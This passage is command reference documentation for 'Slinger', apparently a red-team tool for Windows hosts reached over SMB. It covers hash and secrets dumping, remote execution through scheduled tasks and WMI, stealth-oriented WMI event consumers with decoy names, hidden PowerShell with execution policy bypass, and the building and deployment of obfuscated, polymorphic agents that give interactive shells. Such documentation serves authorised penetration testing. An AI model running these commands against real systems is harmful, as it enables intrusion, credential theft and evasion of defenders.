Display network interfaces on the remote server
```

**Example Usage:**
```
Example Usage: ifconfig
```

---

## `enuminterfaces`

**Description:** Display network interfaces on the remote server

**Help:**
```
ifconfig [-h]
Display network interfaces on the remote server
```

**Example Usage:**
```
Example Usage: ifconfig
```

---

## `hostname`

**Description:** Display the hostname of the remote server

**Help:**
```
hostname [-h]
Display the hostname of the remote server
```

**Example Usage:**
```
Example Usage: hostname
```

---

## `procs`

**Description:** List running processes on the remote server

**Help:**
```
procs [-h] [-v] [-t]
List running processes on the remote server
```

**Example Usage:**
```
Example Usage: procs -t -v
```

---

## `ps`

**Description:** List running processes on the remote server

**Help:**
```
procs [-h] [-v] [-t]
List running processes on the remote server
```

**Example Usage:**
```
Example Usage: procs -t -v
```

---

## `tasklist`

**Description:** List running processes on the remote server

**Help:**
```
procs [-h] [-v] [-t]
List running processes on the remote server
```

**Example Usage:**
```
Example Usage: procs -t -v
```

---

## `fwrules`

**Description:** Display firewall rules on the remote server

**Help:**
```
fwrules [-h]
Display firewall rules on the remote server
```

**Example Usage:**
```
Example Usage: fwrules
```

---

## `set`

**Description:** Set a variable for use in the application

**Help:**
```
set [-h] varname [value]
Set a variable for use in the application
```

**Example Usage:**
```
Example Usage: set varname value
```

### Arguments

- **`varname`**: Set the debug variable to True or False
  - Required: Yes

- **`value`**: Set the mode variable to True or False
  - Default: ``
  - Required: No

---

## `config`

**Description:** Show the current config

**Help:**
```
config [-h]
Show the current config
```

**Example Usage:**
```
Example Usage: config
```

---

## `run`

**Description:** Run a slinger script or command sequence

**Help:**
```
run [-h] (-c CMD_CHAIN | -f FILE)
Run a slinger script or command sequence
```

**Example Usage:**
```
Example Usage: run -c "use C$;cd Users;cd Administrator;cd Downloads;ls"
```

### Arguments

- **`cmd_chain`**: Specify a command sequence to run
  - Required: No

- **`file`**: Specify a script file to run
  - Required: No

---

## `hashdump`

**Description:** Dump hashes from the remote server

**Help:**
```
hashdump [-h]
Dump hashes from the remote server
```

**Example Usage:**
```
Example Usage: hashdump
```

---

## `secretsdump`

**Description:** Dump secrets from the remote server

**Help:**
```
secretsdump [-h]
Dump secrets from the remote server
```

**Example Usage:**
```
Example Usage: secretsdump
```

---

## `env`

**Description:** Display environment variables on the remote server

**Help:**
```
env [-h]
Display environment variables on the remote server
```

**Example Usage:**
```
Example Usage: env
```

---

## `debug-availcounters`

**Description:** Display available performance counters on the remote server. This is for debug use only, it doesn't really give you anything.

**Help:**
```
debug-availcounters [-h] [-f FILTER] [-p] [-s filename]
Display available performance counters on the remote server. This is for debug use only, it doesn't really give you anything.
```

**Example Usage:**
```
Example Usage: availcounters
```

### Arguments

- **`filter`**: Simple filter for case insenstive counters containing a given string
  - Required: No

- **`save`**: Save the available counters to a file
  - Required: No

---

## `debug-counter`

**Description:** Display a performance counter on the remote server. This is for debug use only, it doesn't really give you anything.

**Help:**
```
debug-counter [-h] [-c COUNTER] [-a {x86,x64,unk}] [-i]
Display a performance counter on the remote server. This is for debug use only, it doesn't really give you anything.
```

**Example Usage:**
```
Example Usage: counter -c 123 [-a x86]
```

### Arguments

- **`counter`**: Specify the counter to display
  - Required: No

- **`arch`**: Specify the architecture of the remote server
  - Choices: x86, x64, unk
  - Default: `unk`
  - Required: No

---

## `network`

**Description:** Display network information on the remote server

**Help:**
```
network [-h] [--tcp] [--rdp]
Display network information on the remote server
```

**Example Usage:**
```
Example Usage: network
```

---

## `atexec`

**Description:** Execute a command on the remote server

**Help:**
```
atexec [-h] -c COMMAND --sp SP [--sn SN] [--tn TN] [--ta TA] [--td TD] [--tf TF] [--sh SH] [-i] [-w WAIT]
Execute a command on the remote server
```

**Example Usage:**
```
Example Usage: atexec -tn "NetSvc" -sh C$ -sp \\Users\\Public\\Downloads\\ -c ipconfig
For multi-word commands: atexec -c "echo hello world" -tn MyTask
```

### Arguments

- **`command`**: Specify the command to execute. For commands with spaces, wrap in quotes (e.g., 'echo hello world')
  - Required: Yes

- **`sp`**: Specify the folder to save the output file
  - Default: `\Users\Public\Downloads\`
  - Required: Yes

- **`sn`**: Specify the name of the output file.  Default is <random 8-10 chars>.txt
  - Required: No

- **`tn`**: Specify the name of the scheduled task (default: auto-generated)
  - Required: No

- **`ta`**: Specify the author of the scheduled task
  - Default: `Slinger`
  - Required: No

- **`td`**: Specify the description of the scheduled task
  - Default: `Scheduled task created by Slinger`
  - Required: No

- **`tf`**: Specify the folder to run the task in
  - Default: `\Windows`
  - Required: No

- **`sh`**: Specify the share name to connect to
  - Default: `C$`
  - Required: No

- **`wait`**: Seconds to wait for the task to complete
  - Default: `1`
  - Required: No

---

## `reload`

**Description:** Reload the current sessions context

**Help:**
```
reload [-h]
Reload the current sessions context
```

**Example Usage:**
```
Example Usage: reload
```

---

## `plugins`

**Description:** List available plugins

**Help:**
```
plugins [-h]
List available plugins
```

**Example Usage:**
```
Example Usage: plugins
```

---

## `downloads`

**Description:** Manage resume download states and cleanup

**Help:**
```
downloads [-h] {list,cleanup} ...
Manage resume download states and cleanup
```

**Example Usage:**
```
Example Usage: downloads list
```

### Subcommands

#### `downloads list`

**Description:** Display all active resumable downloads with progress

**Help:**
```
downloads list [-h]
Display all active resumable downloads with progress
```

  - Required: No

---

#### `downloads cleanup`

**Description:** Remove completed, stale, or corrupted download state files

**Help:**
```
downloads cleanup [-h] [--max-age MAX_AGE] [--force]
Remove completed, stale, or corrupted download state files
```

##### Arguments

- **`max_age`**: Remove state files older than N days
  - Default: `7`
  - Required: No

---

## `eventlog`

**Description:** Query Windows Event Logs via RPC over SMB named pipe \pipe\eventlog

**Help:**
```
eventlog [-h] {query,list,check} ...
Query Windows Event Logs via RPC over SMB named pipe \pipe\eventlog
```

**Example Usage:**
```
Example Usage:
  eventlog list                    # List available event logs
  eventlog check --log 'System'    # Check if a specific log exists
  eventlog query --log System --level Error --count 50
  eventlog sources --log Application
```

### Subcommands

#### `eventlog query`

**Description:** Query Windows Event Log entries via RPC over \pipe\eventlog with filtering

**Help:**
```
eventlog query [-h] --log LOG [--id ID] [--type {error,warning,information,success,failure}] [--since SINCE] [--last MINUTES] [--limit LIMIT] [--source SOURCE]
                              [--find FIND] [--format {table,json,list,csv}] [-o OUTPUT] [--verbose] [--order {newest,oldest}]
Query Windows Event Log entries via RPC over \pipe\eventlog with filtering
```

**Example Usage:**
```
Examples:
  eventlog query --log System --id 1000
  eventlog query --log Application --level error --last 60
  eventlog query --log Security --find 'failed logon' --count 20
```

##### Arguments

- **`log`**: Event log name (System, Application, Security, etc.)
- **`id`**: Specific event ID to filter
- **`level`**: Event level to filter
  - Choices: error, warning, information, success, failure
- **`since`**: Events since date (YYYY-MM-DD or 'YYYY-MM-DD HH:MM:SS')
- **`last`**: Events from the last X minutes
- **`limit`**: Maximum number of events to return
  - Default: `1000`
- **`source`**: Filter by event source name
- **`find`**: Search for string in event content
- **`format`**: Output format (default: list)
  - Choices: table, json, list, csv
  - Default: `list`
- **`output`**: Save output to file
- **`order`**: Order events by newest first (default) or oldest first
  - Choices: newest, oldest
  - Default: `newest`
  - Required: No

---

#### `eventlog list`

**Description:** List all available event logs on the remote system via RPC over \pipe\eventlog

**Help:**
```
eventlog list [-h]
List all available event logs on the remote system via RPC over \pipe\eventlog
```

  - Required: No

---

#### `eventlog check`

**Description:** Check if a specific Windows Event Log exists and is accessible

**Help:**
```
eventlog check [-h] --log LOG
Check if a specific Windows Event Log exists and is accessible
```

**Example Usage:**
```
Example Usage: eventlog check --log 'Microsoft-Windows-Sysmon/Operational'
```

##### Arguments

- **`log`**: Event log name to check (can include custom paths)
  - Required: Yes

---

## `wmiexec`

**Description:** Execute commands on the remote system using various WMI execution methods. Each method has different capabilities, stealth levels, and requirements.

**Help:**
```
wmiexec [-h] [--endpoint-info] METHOD ...
Execute commands on the remote system using various WMI execution methods. Each method has different capabilities, stealth levels, and requirements.
```

**Example Usage:**
```
Available Methods:
  task     - Task Scheduler backend (default, most reliable)
  dcom     - Traditional Win32_Process.Create via DCOM
  event    - WMI Event Consumer (stealthy)

Example Usage:
  wmiexec task 'whoami'                    # Task Scheduler method
  wmiexec task 'whoami' --tn MyTask        # Custom task name
  wmiexec dcom 'systeminfo'                # Traditional DCOM
  wmiexec event 'net user' --trigger-delay 5  # Event consumer
```

### Subcommands

#### `wmiexec task`

**Description:** Execute commands using Windows Task Scheduler via WMI. Creates, executes, and cleans up scheduled tasks through the root\Microsoft\Windows\TaskScheduler namespace.

**Help:**
```
wmiexec task [-h] [--tn TN] [--sp SP] [--sn SN] [--cleanup-delay CLEANUP_DELAY] [--no-cleanup] [-i] [--no-output] [--timeout TIMEOUT] [--output filename]
                            [--working-dir WORKING_DIR] [--shell {cmd,powershell}] [--raw-command]
                            [command]
Execute commands using Windows Task Scheduler via WMI. Creates, executes, and cleans up scheduled tasks through the root\Microsoft\Windows\TaskScheduler namespace.
```

**Example Usage:**
```
Example Usage: wmiexec task "whoami"
wmiexec task "dir C:\" --tn MyTask --cleanup-delay 5
wmiexec task --interactive  # Interactive shell
wmiexec task "ipconfig" --output network.txt
```

##### Arguments

- **`command`**: Command to execute (not required for --interactive mode)
- **`tn`**: Custom scheduled task name (default: auto-generated WMI_Task_XXXXX)
- **`sp`**: Directory to save output file
  - Default: `\Windows\Temp\`
- **`sn`**: Name of output file (default: auto-generated wmi_np_output_XXXXX.tmp)
- **`cleanup_delay`**: Seconds to wait before task cleanup
  - Default: `2`
- **`timeout`**: Command execution timeout in seconds
  - Default: `30`
- **`output`**: Save command output to local file
- **`working_dir`**: Working directory for command execution
  - Default: `C:\`
- **`shell`**: Shell to use for command execution
  - Choices: cmd, powershell
  - Default: `cmd`
  - Required: No

---

#### `wmiexec dcom`

**Description:** Execute commands using traditional WMI Win32_Process.Create method via DCOM. Requires DCOM connectivity (ports 135 + dynamic range). May be blocked by firewalls.

**Help:**
```
wmiexec dcom [-h] [-i] [--working-dir WORKING_DIR] [--timeout TIMEOUT] [--output filename] [--no-output] [--sleep-time SLEEP_TIME] [--save-name SAVE_NAME] [--raw-command]
                            [--shell {cmd,powershell}]
                            [command]
Execute commands using traditional WMI Win32_Process.Create method via DCOM. Requires DCOM connectivity (ports 135 + dynamic range). May be blocked by firewalls.
```

**Example Usage:**
```
Command Wrappers:
  DEFAULT: cmd.exe /Q /c "command"     # Standard Windows command
  execution
  --raw-command: command               # No wrapper, execute directly
  --shell powershell: powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -NonInteractive -NoLogo -Command "command"

Raw Command Usage:
  Use --raw-command when you want to execute commands WITHOUT the cmd.exe wrapper:

  Standard (with cmd.exe wrapper):
    wmiexec dcom "whoami"              # Executes: cmd.exe /Q /c whoami
    wmiexec dcom "dir C:\"            # Executes: cmd.exe /Q /c dir C:
  Raw (no wrapper):
    wmiexec dcom "whoami" --raw-command              # Executes: whoami (directly)
    wmiexec dcom "calc.exe" --raw-command            # Executes: calc.exe (directly)
    wmiexec dcom "powershell.exe -Command Get-Process" --raw-command  # Custom PowerShell

Interactive Mode:
  wmiexec dcom --interactive           # Start interactive DCOM shell
  wmiexec dcom --interactive --save-name session.txt  # Save session to file
```

##### Arguments

- **`command`**: Command to execute (not required for --interactive mode)
- **`working_dir`**: Working directory for command execution
  - Default: `C:\`
- **`timeout`**: Command execution timeout in seconds
  - Default: `30`
- **`output`**: Save command output to local file
- **`sleep_time`**: Sleep time before capturing output in seconds
  - Default: `1.0`
- **`save_name`**: Custom filename for remote output capture (default: auto-generated)
- **`shell`**: Shell to use for command execution
  - Choices: cmd, powershell
  - Default: `cmd`
  - Required: No

---

#### `wmiexec event`

**Description:** Execute commands using WMI Event Consumers (highest stealth method).

Examples:
  # Basic usage
  wmiexec event "whoami"

  # Raw command mode (direct CommandLineTemplate)
  wmiexec event "calc.exe" --raw-command                         # ExecutablePath: cmd.exe
  wmiexec event "whoami" --raw-exec ""                           # ExecutablePath: None (blank)
  wmiexec event "Get-Process" --raw-exec "powershell.exe"        # ExecutablePath: powershell.exe

  # Custom artifacts for stealth
  wmiexec event "whoami" --exe pwsh --cname "UpdateConsumer" --fname "MaintenanceFilter" \
    --script-name "check_system" --upload-path "C:\Windows\System32\check_system.ps1" \
    -o "C:\Windows\Logs\system_check.log" --trigger-exe "svchost.exe"

  # With local save
  wmiexec event "systeminfo" -o "C:\temp\info.txt" --save "./sysinfo.txt"


**Help:**
```
wmiexec event [-h] [--consumer-name CONSUMER_NAME] [--filter-name FILTER_NAME] [--trigger-delay TRIGGER_DELAY] [--no-cleanup] [--timeout TIMEOUT] [--no-output]
                             [--save filename] [--working-dir WORKING_DIR] [--shell {cmd,powershell}] [--exe {cmd,pwsh}] [--trigger-exe TRIGGER_EXE] [-t TRIGGER] [-l] [-i] [--system]
                             [--upload-path UPLOAD_PATH] [--script-name SCRIPT_NAME] [-o OUTPUT] [--raw-command] [--raw-exec RAW_EXEC]
                             [command]
Execute commands using WMI Event Consumers (highest stealth method).

Examples:
  # Basic usage
  wmiexec event "whoami"

  # Raw command mode (direct CommandLineTemplate)
  wmiexec event "calc.exe" --raw-command                         # ExecutablePath: cmd.exe
  wmiexec event "whoami" --raw-exec ""                           # ExecutablePath: None (blank)
  wmiexec event "Get-Process" --raw-exec "powershell.exe"        # ExecutablePath: powershell.exe

  # Custom artifacts for stealth
  wmiexec event "whoami" --exe pwsh --cname "UpdateConsumer" --fname "MaintenanceFilter" \
    --script-name "check_system" --upload-path "C:\Windows\System32\check_system.ps1" \
    -o "C:\Windows\Logs\system_check.log" --trigger-exe "svchost.exe"

  # With local save
  wmiexec event "systeminfo" -o "C:\temp\info.txt" --save "./sysinfo.txt"

```

##### Arguments

- **`command`**: Command to execute (not required for --interactive mode)
- **`consumer_name`**: Name for CommandLineEventConsumer (default: auto-generated)
- **`filter_name`**: Name for __EventFilter (default: auto-generated)
- **`trigger_delay`**: Seconds to wait before triggering event
  - Default: `5`
- **`timeout`**: Total execution timeout in seconds
  - Default: `30`
- **`save`**: Save command output to local file
- **`working_dir`**: Working directory for command execution
  - Default: `C:\`
- **`shell`**: Shell to use for command execution
  - Choices: cmd, powershell
  - Default: `cmd`
- **`exe`**: Execution type: 'cmd' (uploads .bat file) or 'pwsh' (uploads .ps1 file)
  - Choices: cmd, pwsh
  - Default: `cmd`
- **`trigger_exe`**: Executable to trigger the Event Filter (default: notepad.exe). Will be automatically spawned after consumer creation.
  - Default: `notepad.exe`
- **`trigger`**: Only trigger an existing Event Consumer (no creation). Specify executable to spawn.
- **`upload_path`**: Custom script upload path on target (default: C:\Windows\Temp\RANDOM_NAME.ext where ext is .bat for cmd or .ps1 for pwsh)
- **`script_name`**: Custom script filename (without extension, will be auto-appended based on --exe type). If not specified, completely random name is generated.
- **`output`**: Custom remote output file path for capturing command results (default: C:\Windows\Temp\out_RANDOM.tmp). Supports CMS notation.
- **`raw_exec`**: Put the entire command directly into CommandLineTemplate. ExecutablePath is set to the provided string value.
  - Required: No

---

#### `wmiexec query`

**Description:** Execute WMI Query Language (WQL) queries against the remote system. Supports interactive mode, class description, and multiple output formats.

**Help:**
```
wmiexec query [-h] [--interactive] [--describe CLASS] [--list-classes] [--template TEMPLATE] [--list-templates] [--namespace NAMESPACE] [--format {list,table,json,csv}]
                             [-o FILE] [--timeout SECONDS]
                             [query]
Execute WMI Query Language (WQL) queries against the remote system. Supports interactive mode, class description, and multiple output formats.
```

**Example Usage:**
```
Query Examples:
  wmiexec query "SELECT * FROM Win32_Process"
  wmiexec query "SELECT Name, ProcessId FROM Win32_Process WHERE Name = 'notepad.exe'"
  wmiexec query "SELECT * FROM Win32_Service WHERE State = 'Running'"
  wmiexec query --describe Win32_Process
  wmiexec query --interactive
  wmiexec query --template processes --timeout 300
  wmiexec query "SELECT * FROM Win32_UserAccount" --format json -o users.json
  wmiexec query --template processes --format table
```

##### Arguments

- **`query`**: WQL query string to execute (e.g., 'SELECT * FROM Win32_Process')
- **`describe`**: Describe WMI class schema (e.g., --describe Win32_Process)
- **`template`**: Execute predefined query template (use --list-templates to see available)
- **`namespace`**: WMI namespace to query (default: root/cimv2)
  - Default: `root/cimv2`
- **`format`**: Output format for query results (default: list)
  - Choices: list, table, json, csv
  - Default: `list`
- **`output`**: Save query results to file
- **`timeout`**: Query timeout in seconds (default: 120)
  - Default: `120`
  - Required: No

---

## `agent`

**Description:** Build polymorphic C++ agents for named pipe command execution

**Help:**
```
agent [-h] {build,info,deploy,list,rename,check,use,start,kill,rm,reset,update} ...
Build polymorphic C++ agents for named pipe command execution
```

**Example Usage:**
```
Example Usage: agent build --arch x64 --encryption | agent build --arch both --no-encryption
```

### Subcommands

#### `agent build`

**Description:** Build C++ agents with advanced obfuscation and polymorphic encryption

**Help:**
```
agent build [-h] [--arch {x86,x64,both}] [--encryption] [--no-encryption] [--debug] [--output-dir OUTPUT_DIR] [--dry-run] [--pipe PIPE] [--name NAME] [--pass PASSPHRASE]
                           [--obfuscate] [--upx PATH]
Build C++ agents with advanced obfuscation and polymorphic encryption
```

**Example Usage:**
```
Example: agent build --arch x64 --encryption --debug
```

##### Arguments

- **`arch`**: Target architecture for agent build
  - Choices: x86, x64, both
  - Default: `both`
- **`output_dir`**: Custom output directory for built agents
- **`pipe`**: Specify custom pipe name for the agent (default: slinger)
  - Default: `slinger`
- **`name`**: Specify custom name for the output binary file
- **`passphrase`**: Passphrase for agent authentication (HMAC-SHA256 with PBKDF2)
- **`upx`**: Pack binary with UPX (provide path to upx binary, or use 'upx' for system default)
  - Required: No

---

#### `agent info`

**Description:** Display configuration and capabilities of the agent builder

**Help:**
```
agent info [-h]
Display configuration and capabilities of the agent builder
```

  - Required: No

---

#### `agent deploy`

**Description:** Upload and execute polymorphic agent on target system via SMB

**Help:**
```
agent deploy [-h] --path PATH [--name NAME] [--start] [--pipe PIPE] agent_path
Upload and execute polymorphic agent on target system via SMB
```

**Example Usage:**
```
Example: agent deploy /home/user/slinger_agent_x64.exe --path temp\ --start
```

##### Arguments

- **`agent_path`**: Path to the agent executable to deploy
- **`path`**: Target path relative to current share (e.g., temp\, Windows\Temp\)
- **`name`**: Custom name for deployed agent (default: random)
- **`pipe`**: Specify pipe name for the agent (must match build-time pipe name)
  - Required: No

---

#### `agent list`

**Description:** Show all deployed agents and their status

**Help:**
```
agent list [-h] [--host HOST] [--del DELETE_AGENT] [-f {table,list,json}]
Show all deployed agents and their status
```

**Example Usage:**
```
Example: agent list -f json
```

##### Arguments

- **`host`**: Filter agents by host
- **`delete_agent`**: Remove agent from registry by ID (use 'all' to remove all agents)
- **`format`**: Output format (default: table)
  - Choices: table, list, json
  - Default: `table`
  - Required: No

---

#### `agent rename`

**Description:** Change the ID of a deployed agent in the registry

**Help:**
```
agent rename [-h] --old OLD --new NEW
Change the ID of a deployed agent in the registry
```

**Example Usage:**
```
Example: agent rename --old svchost_abc123 --new my_agent
```

##### Arguments

- **`old`**: Current agent ID
- **`new`**: New agent ID
  - Required: Yes

---

#### `agent check`

**Description:** Verify if the agent process is still running via WMI query

**Help:**
```
agent check [-h] agent_id
Verify if the agent process is still running via WMI query
```

**Example Usage:**
```
Example: agent check svchost_abc123
```

##### Arguments

- **`agent_id`**: Agent ID to check
  - Required: Yes

---

#### `agent use`

**Description:** Connect to and interact with a deployed agent via named pipe.

ENCRYPTION & SESSION SECURITY:
  Agents built with --pass use AES-256-GCM encryption with HMAC-SHA256
  authentication. Each session uses unique encryption keys:

  1. Agent generates random 16-byte nonce when you connect
  2. Client proves knowledge of passphrase via HMAC-SHA256 challenge-response
  3. Both derive session key using PBKDF2-HMAC-SHA256(passphrase_hash,
     nonce, 10k iterations)
  4. All commands in the session are encrypted with AES-256-GCM using this key

  FORWARD SECRECY: Each session gets a new random nonce and unique session
  key. Compromising one session does NOT affect past or future sessions.
  To refresh encryption keys, exit and reconnect for a new session.

INTERACTIVE SHELL COMMANDS:
  help        - Show available commands
  exit/quit   - Close session and disconnect from agent
  <command>   - Execute any Windows command on the agent


**Help:**
```
agent use [-h] [--timeout TIMEOUT] [--no-colors] agent_id
Connect to and interact with a deployed agent via named pipe.

ENCRYPTION & SESSION SECURITY:
  Agents built with --pass use AES-256-GCM encryption with HMAC-SHA256
  authentication. Each session uses unique encryption keys:

  1. Agent generates random 16-byte nonce when you connect
  2. Client proves knowledge of passphrase via HMAC-SHA256 challenge-response
  3. Both derive session key using PBKDF2-HMAC-SHA256(passphrase_hash,
     nonce, 10k iterations)
  4. All commands in the session are encrypted with AES-256-GCM using this key

  FORWARD SECRECY: Each session gets a new random nonce and unique session
  key. Compromising one session does NOT affect past or future sessions.
  To refresh encryption keys, exit and reconnect for a new session.

INTERACTIVE SHELL COMMANDS:
  help        - Show available commands
  exit/quit   - Close session and disconnect from agent
  <command>   - Execute any Windows command on the agent

```

**Example Usage:**
```
Example: agent use agent_12345 --no-colors
```

##### Arguments

- **`agent_id`**: Agent ID to connect to
- **`timeout`**: Connection timeout in seconds (default: 30)
  - Default: `30`
  - Required: No

---

#### `agent start`

**Description:** Start a stopped or crashed agent using its deployment information

**Help:**
```
agent start [-h] agent_id
Start a stopped or crashed agent using its deployment information
```

**Example Usage:**
```
Example: agent start svcctl_tui0
```

##### Arguments

- **`agent_id`**: Agent ID to start
  - Required: Yes

---

#### `agent kill`

**Description:** Find and terminate the agent process using WMI and taskkill

**Help:**
```
agent kill [-h] agent_id
Find and terminate the agent process using WMI and taskkill
```

**Example Usage:**
```
Example: agent kill svchost_abc123
```

##### Arguments

- **`agent_id`**: Agent ID to kill
  - Required: Yes

---

#### `agent rm`

**Description:** Delete the agent executable file and update registry status

**Help:**
```
agent rm [-h] agent_id
Delete the agent executable file and update registry status
```

**Example Usage:**
```
Example: agent rm svchost_abc123
```

##### Arguments

- **`agent_id`**: Agent ID to remove
  - Required: Yes

---

#### `agent reset`

**Description:** Kill all running agent processes and delete all agent files

**Help:**
```
agent reset [-h]
Kill all running agent processes and delete all agent files
```

**Example Usage:**
```
Example: agent reset
```

  - Required: Yes

---

#### `agent update`

**Description:** Update the agent's file path in the registry

**Help:**
```
agent update [-h] --path PATH agent_id
Update the agent's file path in the registry
```

**Example Usage:**
```
Example: agent update svchost_abc123 --path c:\new\path\agent.exe
```

##### Arguments

- **`agent_id`**: Agent ID to update
- **`path`**: New file path for the agent
  - Required: Yes

---
